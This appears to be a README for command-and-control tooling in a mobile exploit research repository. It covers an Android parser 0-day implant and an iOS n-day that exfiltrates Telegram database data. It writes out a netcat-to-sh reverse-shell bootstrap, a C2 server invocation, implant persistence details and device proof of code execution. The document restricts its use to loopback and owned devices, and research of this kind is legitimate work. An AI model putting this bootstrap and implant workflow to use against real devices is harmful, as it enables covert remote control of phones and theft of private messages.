# C2: command and control

Two C2 references are kept:

- `c2560s/`; the Android parser-0day C2: a TCP control server, a loader
  server, a shell implant, a supervisor, and the bootstrap tool. Device-proven
  on the Sony (session `tg-10346-XQ-BT52`, `exec id` rc=0).
- `ios-1827/`; the iOS #1827 reference C2: a small TCP listener and the DB
  decode/export helpers used by the 17e n-day run.

Both are **local-only**: loopback or the researcher's private LAN, local peers
only. No public tunnel, no cloud relay.

## c2560s: Android

Files:

```
c2560s/
  server/c2_server.py      control + loader server, sessions, CLI, batch
  server/c2common.py       bootstrap renderer, local-only checks, token check
  implant/implant.sh       POSIX sh / toybox shell implant
  implant/supervisor.sh    watchdog; restarts the implant, watches the app PID
  tools/make_bootstrap.py  prints the exact system() bootstrap
  tools/patch_payload.py   swaps the endgame command in a payload
  README.md                full manual: protocol, deployment, troubleshooting
```

The widget's `system()` command is a 44-50 character loopback bootstrap:

```
setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
```

`setsid` detaches the pipeline so `system()` returns immediately. `sleep 5`
holds `toybox nc`'s stdin open. `| sh` runs the bootstrap served on the loader
port.

Server:

```sh
python3 docs/c2/c2560s/server/c2_server.py \
  --host 127.0.0.1 --port 4444 --loader-port 5555 \
  --bootstrap nc --token <TOKEN> \
  --wait-session 180 --cmd sessions --cmd "exec id"
```

On the phone, `adb reverse tcp:4444 tcp:4444` and
`adb reverse tcp:5555 tcp:5555` map the loopback ports to the host.

Proof (2026-11-07 23:52:46):

```
session 1 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346 device=XQ-BT52 from=127.0.0.1
uid=10346(u0_a346) ... context=u:r:untrusted_app:s0:c90,c257,c512,c768
[exec rc=0 0.52s]
```

Timing on 2026-11-08: **1.913 s** from message open to the C2 `hello`.

The implant survives an app crash (`setsid` + supervisor) but not
`am force-stop` or a reboot. It runs as the app UID, not root. The loader port
has no TCP auth (the token is inside the served script); use a trusted LAN or
loopback only.

Read `c2560s/README.md` before running it. It documents the protocol, the
bootstrap, the applet requirements, and the persistence limits.

## ios-1827: iOS reference

Files:

```
ios-1827/
  c2_loop.py         TCP listener; writes each connection to a file
  decode_db.py       decode a Postbox / SQLite file
  db_export_core.py  export rows from the Telegram DB
```

The iOS payload performs `open → read → write → connect`; the listener accepts
the connection and writes the exfiltrated bytes to a file. The 17e run
exfiltrated a 3,039-byte `lockState.json` and a 3,039-byte DB header. The 6s
run wrote a local `RCE_OK` file; the sandbox denies process creation, so there
is no shell.

These tools are reference only. The public n-day is in `vulns/nday-1-RCE-V7-RGX-1827/`.

## Safety

- Bind to `127.0.0.1` or a private LAN address. The server refuses non-private
  binds and peers.
- Do not expose the loader port to the internet.
- Do not commit the token. Pass `--token` or set `C2_TOKEN`.
- Do not run the C2 against a device you do not own.
